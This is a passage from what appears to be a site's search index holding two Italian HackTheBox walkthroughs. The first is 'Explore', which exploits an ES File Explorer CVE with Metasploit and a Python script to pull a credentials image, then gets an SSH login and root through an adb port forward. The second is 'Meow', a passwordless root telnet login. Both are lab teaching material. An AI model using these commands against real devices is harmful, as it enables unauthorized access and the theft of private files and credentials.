RHOSTS con l‚ÄôIP dell‚Äôhost e si digita exploit:\n1. set RHOSTS 10.10.10.247 2. exploit  Il risultato √® positivo. L‚Äôazione del parametro √® stata impostata, per impostazione predefinita su GETDEVICEINFO e quindi l‚Äôuscita mostra informazioni sul dispositivo. Elenchiamo tutte le azioni di questo modulo.\nshow actions  Impostando l‚Äôazione su LISTPICS, si ottengono i seguenti risultati.\n1. set action LISTPICS 2. exploit  Questa istruzione sembra elencare tutte le immagini memorizzate nella directory DCIM del telefono. Impostiamo l‚Äôazione su GETFILE e scarichiamo il file creds.jpg:\n1. set action GETFILE 2. set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg 3. exploit  Successivamente, possiamo aprire l‚Äôimmagine utilizzando il visualizzatore di immagini feh:\n1. sudo apt install feh 2. feh ~/.msf4/loot/20211025151836_default_10.10.10.247_getFile_410464.jpg Sfruttamento dell‚ÄôExploit con CVE (Script Python) Effettuando delle ricerce sul ES File Explorer 4.1.9.7.4 troviamo la seguente pagina di Exploit Databse:\nSalviamo il codice di questo exploit. ES File Explorer crea un servizio HTTP associato alla porta 59777 in fase di esecuzione, che fornisce oltre 10 comandi per l‚Äôaccesso ai dati nel telefono cellulare dell‚Äôutente e l‚Äôesecuzione dell‚Äôapplicazione; tuttavia, il servizio non controlla questa richiesta. Eseguendo l‚Äôexploit usando python3 otteniamo un elenco di comandi disponibili che possiamo effettivamente eseguire usando quell‚Äôexploit:\npython3 [script].py --cmd GetDeviceInfo --ip [address]  Innanzitutto, possiamo provare a cercare le credenziali memorizzate in Pics o in Files:\npython3 [script].py listPics [address]  Possiamo accedere ai file utilizzando il nostro browser o scaricandoli singolarmente. C‚Äô√® un file chiamato creds.jpg che possiamo scaricare usando il comando come segue:\npython3 [script].py getFile [address] /storage/emulated/0/DCIM/creds.jpg  Entrambe le strade viste portano al medesimo risultato, ossia avere questo file con le credenziali ssh:\nQuesto sembra un notebook con la password Kr1sT!5h@Rp3xPl0r3! per l‚Äôutente kristi. Utilizziamo queste credenziali e proviamo ad accedere tramite SSH alla porta 2222 che abbiamo trovato in precedenza.\nssh kristi@10.10.10.247 -p 2222  La flag user.txt si trova in /storage/emulated/0/user.txt:\nPrivilage Escalation Avendo accesso all‚Äôhost remoto tramite SSH, si pu√≤ eseguire il seguente comando per assicurarsi che la porta porta filtrata 5555, trovata in precedenza, sia in esecuzione:\nss -ntpl Poich√© la porta 5555 √® filtrata e non possiamo raggiungerla da remoto tramite adb, proviamo a inoltrarla tramite SSH e riprovare di nuovo. Per inoltrare la porta a livello locale, digitate il seguente comando, utilizzando la password Kr1sT!5h@Rp3xPl0r3! ancora una volta:\nssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 Lo strumento Android Debug Bridge (ADB) sembra essere disponibile sul gestore di pacchetti apt. Installiamolo eseguendo eseguendo il seguente comando:\n1. sudo apt install adb 2. adb --help Nella sezione rete vediamo che utilizzando l‚Äôistruzione connect possiamo collegarci al dispositivo Android. Eseguiamo nuovamente adb dalla nostra macchina locale utilizzando il nostro IP locale:\nadb connect 127.0.0.1:5555  √à possibile elencare i dispositivi collegati eseguendo il seguente comando:\nadb devices  Quindi, si pu√≤ digitare quanto segue per ottenere la shell sulla macchina remota:\nadb -s 127.0.0.1 shell Digitiamo ‚Äúsu‚Äù per diventare utenti root:\nNella directory data vi sar√° la nostra flag:\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/walkthrough-explore/walkthrough_explore_ctf/","tags":["CTF","HackTheBox","Android","Metasploit","CVE"],"title":"Walkthrough Explore"},{"categories":["Walkthrough HackTheBox"],"contents":"Table Of Contents:\n Enumerazione con Nmap Connessione a Telnet   Enumerazione con Nmap La primissima cosa √® stata eseguire una scansione nmap per vedere quali porte sono aperte, e anche i servizi in esecuzione su ciascuna porta aperta. Ho etichettato specificamente tre porte.\nIl comando √©:\nnmap -sVC -n -A -Pn -p 22, 23, 80 [address] --min-rate 5000 L\u0026rsquo;output:\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-11-24 22:45 CET Nmap scan report for 10.129.46.55 Host is up (0.046s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 23/tcp open telnet Linux telnetd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.50 seconds Connessione a Telnet Troviamo la porta 23 aperta e sta eseguendo un servizio telnet, proviamo a connetterci alla porta telnet 23.\nUsa il comando:\nsudo apt-get install telnet se non lo hai installato o stai usando una VM, poi lanciamo:\ntelnet [address] L\u0026rsquo;output sar√†:\nCi viene presentata una schermata di accesso. Tenendo presente il suggerimento fornito nell‚Äôattivit√† precedente. Un utente root √® in grado di accedere al servizio telnet senza password. Abbiamo provato a utilizzare il root e abbiamo ottenuto l‚Äôaccesso.\nConfermiamo nel terminale se siamo l‚Äôutente root.\nSe elenchiamo i file nella directory di lavoro corrente, vediamo che flag.txt √® elencato.\n","date":null,"permalink":"https://kobra3390.github.io/SpaceHack/posts/walkthrough-meow/walkthrough_meow_ctf/","tags":["CTF","HackTheBox","Telnet"],"title":"Walkthrough Meow"}]